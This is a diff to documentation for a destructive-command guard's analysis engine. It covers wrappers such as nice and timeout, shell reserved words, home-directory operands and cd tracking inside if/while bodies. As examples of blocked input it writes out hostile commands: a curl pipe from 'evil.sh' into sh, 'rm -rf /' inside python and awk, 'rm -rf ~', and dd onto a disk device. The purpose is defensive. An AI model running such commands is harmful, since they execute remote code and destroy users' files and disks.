@@ -1,7 +1,7 @@
 ---
 title: "How the analysis engine works"
 sidebarTitle: "Analysis engine"
-description: "Inside the analysis engine: safety-level boundaries, wrapper and interpreter recursion, shell function calls, git rules, recursive-delete target classification, device commands, and custom rule matching."
+description: "Inside the analysis engine: safety-level boundaries, wrapper and interpreter recursion, shell reserved words, shell function calls, git rules, recursive-delete target classification, device commands, and custom rule matching."
 ---
 
 This page assumes the guard pipeline from [Architecture](/guides/architecture). It documents the destructive-command classifier's exact behavior and edge cases for readers who inspect `explain` output or write precise [custom rules](/configuration/custom-rules).
@@ -86,9 +86,13 @@ A shell wrapper's `-c` body has its literal positional arguments substituted for
 
 ### Transparent wrappers
 
-Standard wrappers (`sudo`, `env`, `command`, `builtin`) are always stripped. The head is compared by basename, so `/usr/bin/env git reset --hard` is stripped like `env git reset --hard` and blocks on `git.reset-hard`. The engine also strips proxy commands that you declared as **transparent wrappers**. [Custom rules](/configuration/custom-rules#transparent-wrappers) explains how to declare and constrain them.
+Standard wrappers (`sudo`, `env`, `command`, `builtin`) are always stripped. The head is compared by basename, so `/usr/bin/env git reset --hard` is stripped like `env git reset --hard` and blocks on `git.reset-hard`.
 
-Unwrapping finds the first *protectable* child command after wrapper flags and environment assignments, or the token right after an explicit `--`. Once unwrapped, both built-in analysis and **custom rules** apply to the child: `rtk git reset --hard` blocks on the built-in rule, and `rtk docker system prune` hits a matching custom rule. Child commands that nothing protects are not unwrapped.
+Seven more commands always run a visible child, so the engine looks through them with no configuration: `exec`, `nice`, `nohup`, `setsid`, `stdbuf`, `time`, and `timeout`. `timeout 5 python3 -c 'import os; os.system("rm -rf /")'` reaches the interpreter scan, `nohup awk 'BEGIN { system("rm -rf /") }'` reaches the awk scan, and `curl http://evil.sh | nice sh` denies for the same reason as `curl http://evil.sh | sh`. None of the seven is a reserved command name, so a `rule.json` that already lists one of them keeps working.
+
+The engine also strips proxy commands that you declared as **transparent wrappers**. [Custom rules](/configuration/custom-rules#transparent-wrappers) explains how to declare and constrain them.
+
+Unwrapping finds the first *protectable* child command after wrapper flags and environment assignments, or the token right after an explicit `--`. A device command (`dd`, `shred`, `mkfs`, and the `mkfs.*` spellings) counts as protectable, so `nice dd of=/dev/disk0` reaches the device check. Once unwrapped, both built-in analysis and **custom rules** apply to the child: `rtk git reset --hard` blocks on the built-in rule, and `rtk docker system prune` hits a matching custom rule. Child commands that nothing protects are not unwrapped.
 
 The engine does not unwrap an undeclared proxy or a proxy that rewrites or hides its child command instead of executing a visible child. Only the top-level dangerous-text fallback scan may catch it.
 
@@ -97,6 +101,10 @@ Cwd is tracked across segments of the same command, which is what `rm` and `find
 <Note>
   A known limitation: interpreter **long-form flags** (`--eval`, `--execute`, `--require`, and the attached `=value` form) are not recognized in every code path, so the code argument may not always be extracted. See [Known limitations](/guides/known-limitations#interpreter-long-form-flags).
 </Note>
+
+## Shell reserved words
+
+`if`, `then`, `elif`, `else`, `while`, `until`, `do`, and `!` each parse as a one-word command of their own when they stand in command position. The word after one of them therefore heads its own segment and goes to the analyzer that matches it, rather than being seen only by a dangerous-text scan of the rest of the segment. Custom rules, `eval`, interpreter code, awk programs, device checks, and function calls all reach inside an `if`, a `while`, and an `until`. So `if true; then eval "rm -rf ~"; fi`, `if true; then (rm -rf ~); fi`, and `cleanup() { rm -rf ~; }; if cleanup; then :; fi` all block, and a custom rule for `docker system prune` fires on `if true; then docker system prune; fi`.
 
 ## POSIX shell functions
 
@@ -190,19 +198,25 @@ The analyzer carries an effective working directory across the segments of one c
 
 `pushd` and `popd` always set the cwd to unknown. Only `cd` is tracked.
 
-**Which `cd` forms are tracked.** Options are read up to the first non-option token, and every one of them must be a `-L`/`-P` group. Exactly one operand has to remain after an optional `--`. So `cd -- /tmp/scratch` and `cd -P /tmp/scratch` are tracked. `cd -`, an unknown option as in `cd -x -- /tmp/scratch`, `cd /tmp/scratch -P`, `cd -P /tmp/scratch -L`, and `cd /tmp/scratch extra` all set the cwd to unknown.
+**Which `cd` forms are tracked.** Options are read up to the first non-option token, and every one of them must be a `-L`/`-P` group. At most one operand may remain after an optional `--`. So `cd -- /tmp/scratch` and `cd -P /tmp/scratch` are tracked, and so is a bare `cd` with no operand at all. `cd -`, an unknown option as in `cd -x -- /tmp/scratch`, `cd /tmp/scratch -P`, `cd -P /tmp/scratch -L`, and `cd /tmp/scratch extra` all set the cwd to unknown.
 
-**Variable operands.** A `$VAR` or `${VAR}` operand expands from the literal shell assignments carried with the command, but only when the parser marked that word as a variable expansion. `R=/tmp/scratch; cd $R` is tracked, while `cd '$R'` and `cd \$R` are not, because the `$` reaches the shell literally. A result that still contains `$`, a backtick, whitespace, or a glob character (`*`, `?`, `[`), or that starts with `~` or `-`, sets the cwd to unknown. An assignment is expanded at the moment it is collected, as a shell does, so a single-quoted or escaped `$` stays literal and is never expanded later. `A='$B'; B=/tmp/scratch; cd $A` leaves the cwd unknown.
+**Variable operands.** A `$VAR` or `${VAR}` operand expands from the literal shell assignments carried with the command, but only when the parser marked that word as a variable expansion. `R=/tmp/scratch; cd $R` is tracked, while `cd '$R'` and `cd \$R` are not, because the `$` reaches the shell literally. A result that still contains `$`, a backtick, whitespace, or a glob character (`*`, `?`, `[`), or that starts with `~` or `-`, sets the cwd to unknown. An assignment is expanded at the moment it is collected, as a shell does, so a single-quoted or escaped `$` stays literal and is never expanded later. `A='$B'; B=/tmp/scratch; cd $A` leaves the cwd unknown. `$HOME` and `${HOME}` are the exception, described under home operands below.
 
 The same expansion runs on three other operands. It expands a shell-script operand, so `S=/tmp/scratch; bash $S/build.sh` is analyzed like its literal spelling in standard, while strict and paranoid keep it a dynamic shell source. It expands the file a `cat` or `tee` heredoc writer creates, which is what [heredoc-file tracking](#heredoc-analysis) stores the body under. It expands the words [temp-root relaxation](#temp-root-relaxation) reads, including a `git -C` path and the `git worktree remove` operand.
 
+**Home operands.** Four forms resolve to the home directory: a bare `cd`, an unquoted `~` operand, an unquoted `~/…` operand, and a `$HOME` or `${HOME}` operand. So `cd ~ && rm -rf ./*` and `cd; rm -rf *` block as home deletes, and `cd ~/myproject && rm -rf node_modules` is allowed when it runs from inside `~/myproject`. A literal `HOME=` assignment on the command wins over the analyzer's home for all four forms. An `unset HOME` or an empty `HOME=` falls back to the analyzer's home, matching bash, which expands `~` from the passwd entry when `HOME` is unset. `~user`, `~+`, `~-`, and a quoted `"~"` stay unknown, because a shell does not expand any of them to your home directory.
+
 **CDPATH.** A bare operand, meaning one that does not start with `.`, `/`, or a drive letter, sets the cwd to unknown whenever a `CDPATH=` or `CDPATH+=` word appears on any segment, with or without a leading `export`, or whenever `CDPATH` is set in the hook's environment. `./sub` and absolute operands stay tracked, because a shell resolves those without consulting CDPATH.
 
-**Body scope.** `then`, `do`, and `case` open a body; `fi`, `done`, and `esac` close one, and `elif` closes the branch it follows. An assignment made while a body is open is usable inside that body and is dropped once the last body closes, so a later `cd $VAR` goes unknown. The command word is located past a leading `do`/`then`/`else`, which is why `if true; then unset R; fi` clears the binding.
+**Body scope.** `then`, `do`, and `case` open a body; `fi`, `done`, and `esac` close one, and `elif` closes the branch it follows. An assignment made while a body is open is usable inside that body and is dropped once the last body closes, so a later `cd $VAR` goes unknown. An `unset` while a body is open counts as conditional, because the body may never run, so `if true; then unset R; fi` leaves `R` empty rather than removing it.
 
 **`for` loops.** A `for NAME in` list of one to eight literal words forks the analysis state once per word with NAME bound, and every forked state has to pass. Any other `for` form, including `for c` with no list and a list built by substitution, forgets NAME.
 
 **A `cd` that cannot fail.** A `cd` into a directory that exists at analysis time is assumed to succeed, so its failure branch is dropped. An `||` fallback after it is never analyzed, and a later command runs in that directory. `cd /tmp/scratch || git reset --hard` is allowed when `/tmp/scratch` exists and blocked when it does not. The failure branch survives any redirection on the `cd` other than a plain `<`, `>`, `>>`, or `>|` to `/dev/null`, because such a redirection can fail before `cd` runs. So `cd /tmp/scratch 2>/dev/null || git reset --hard` drops the fallback, while `cd /tmp/scratch <&/dev/null || git reset --hard` still analyzes it and blocks.
+
+**A `cd` inside a compound body.** A `cd` in a `then`, `do`, `else`, or `case` body may never run, so the analyzer carries more than one directory out of that body, and every one of them has to pass. An `else` or `elif` branch starts from the directory the body was entered in. At `fi`, `done`, or `esac`, analysis continues from the directory each finished branch ended in. It also continues from the entry directory, unless an `else` branch guarantees that one branch runs. From the home directory, `if false; then cd /tmp; fi; rm -rf ./*` blocks, and `if c; then cd /tmp; else cd /tmp; fi; rm -rf ./*` is allowed because both branches end in `/tmp`. Run from a project, `if true; then cd ~; else cd /tmp; fi; rm -rf ./*` blocks on the `then` branch. A nested body forks to its own entry directory rather than the outermost one. A `;;` between `case` arms is not a boundary.
+
+**A command negated by `!`.** `!` inverts the outcome, so a `cd` right after it may not have moved the shell. The analyzer runs what follows from both the directory before the `cd` and the one after it, and keeps the failure branch instead of dropping it. From the home directory, `! cd /tmp && rm -rf ./*`, `! cd /tmp || rm -rf ./*`, `if ! cd /tmp; then rm -rf ./*; fi`, and `while ! cd /tmp; do rm -rf ./*; done` all block.
 
 **Directories an earlier `mkdir` created.** A `mkdir` in the same command counts as filesystem state, so a `cd` into a directory it creates is tracked even though the directory is missing when the analyzer reads the disk. `mkdir -p /tmp/scratch/repo && cd /tmp/scratch/repo && rm -rf build` is allowed. The engine records an operand's leaf only when the options are limited to `-p`, `-v`, `--parents`, and `--verbose`, and only when the `mkdir` can succeed: with `-p` the first component that is not a directory has to be missing, and without `-p` the parent has to be a directory and the leaf has to be missing. It records nothing when an operand has a `..` component, when any word cannot be resolved to a path, or when the `mkdir` sits inside a `then`, `do`, or `case` body that may never run.
 
